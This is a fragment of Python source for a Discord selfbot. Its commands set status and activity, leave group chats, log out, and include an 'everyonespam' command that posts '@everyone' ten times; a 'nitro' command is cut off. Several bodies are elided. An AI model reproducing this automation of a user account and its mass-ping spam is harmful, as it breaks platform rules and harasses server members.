    for channel in Daddyt.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@Daddyt.command(aliases=["streaming"])
async def stream(ctx, *, message):
    ...
    await Daddyt.change_presence(activity=stream)


@Daddyt.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Daddyt.change_presence(activity=game)


@Daddyt.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Daddyt.change_presence(
...
@Daddyt.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Daddyt.change_presence(activity=None, status=discord.Status.dnd)
...
@Daddyt.command(aliases=["fliptable"])
...
@Daddyt.command(aliases=["everyonespam"])
async def everyone(ctx):
    await ctx.message.delete()
    for _i in range(10):
        await ctx.send('@everyone')

@Daddyt.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Daddyt.logout()


@Daddyt.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
